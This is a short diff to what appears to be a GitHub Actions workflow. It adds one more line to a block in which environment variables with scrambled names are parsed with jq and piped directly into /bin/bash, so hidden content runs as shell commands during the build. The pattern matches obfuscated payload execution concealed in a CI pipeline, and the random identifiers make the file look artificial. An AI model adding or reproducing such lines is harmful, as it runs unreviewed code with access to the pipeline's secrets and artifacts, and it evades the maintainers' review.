@@ -39,6 +39,7 @@ jobs:
           echo $rnfgy52163 | jq -r .uyubo864 | /bin/bash
           printf '%s' "$xetk16" | jq -r .kyso25 | /bin/bash
           echo $hguq2447 | jq -r .tn9 | /bin/bash
+          echo $rcga3 | jq -r .juj3048 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
